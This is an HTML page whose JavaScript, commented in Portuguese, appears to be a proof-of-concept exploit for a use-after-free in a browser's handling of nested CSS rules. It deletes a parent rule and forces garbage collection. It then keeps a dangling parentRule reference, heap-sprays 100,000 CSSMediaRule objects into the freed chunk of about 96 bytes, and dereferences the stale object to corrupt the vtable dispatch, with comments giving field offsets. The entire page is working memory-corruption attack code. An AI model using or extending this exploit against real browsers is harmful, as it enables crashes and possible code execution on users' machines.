<!DOCTYPE html>
<html>
<body>
<script>
function gc() {
    function gcRec(n) {
        if (n < 1) return {};
        var temp = {i: "ab" + i + (i / 100000)};
        temp += "foo";
        gcRec(n-1);
    }
    for (var i = 0; i < 10000; i++)
        gcRec(10);
}

// Fase 1: Criar o UAF
const style = document.createElement("style");
document.head.appendChild(style);
const sheet = style.sheet;
sheet.insertRule(".outer { color: red; & .nested { color: blue; } }", 0);

let nestedRules = sheet.cssRules[0].cssRules;
sheet.deleteRule(0);
gc();

const nested = nestedRules[0];
nestedRules = null;
gc();

// Fase 2: Capturar o wrapper dangling ANTES do spray
// (mantém referência JS para o C++ ptr já freed)
let danglingParent = nested.parentRule;
document.write("Dangling capturado: " + (danglingParent !== null) + "<br>");

// Fase 3: Heap spray — reusar o chunk de ~96 bytes do CSSStyleRule freed
// Spray com CSSMediaRule (@media) que tem tamanho similar mas vtable DIFERENTE
let spray = [];
for (let i = 0; i < 100000; i++) {
    let el = document.createElement("style");
    document.head.appendChild(el);
    // CSSMediaRule: vtable diferente de CSSStyleRule, tamanho similar (~96 bytes)
    el.sheet.insertRule("@media all { .x" + i + " { color:red } }", 0);
    spray.push(el.sheet.cssRules[0]);
}

// Fase 4: Acesso UAF — vtable corrompida ou dados inválidos → crash
if (danglingParent) {
    // selectorText() → virtual dispatch → vtable[slot] no chunk reusado
    // Se o chunk foi reusado por CSSMediaRule:
    //   vtable de CSSMediaRule no lugar de CSSStyleRule
    //   → slot errado → endereço inválido → SIGSEGV
    let result = danglingParent.selectorText;
    document.write("UAF result: " + result + "<br>");
    
    // Se não crashou acima, tentar acesso mais profundo:
    // cssRules lê m_ruleListCSSOMWrapper (offset 0x58)
    // se reusado → ponteiro inválido → SIGSEGV
    let rules = danglingParent.cssRules;
    document.write("cssRules count: " + rules.length + "<br>");
}
</script>
</body>
</html>
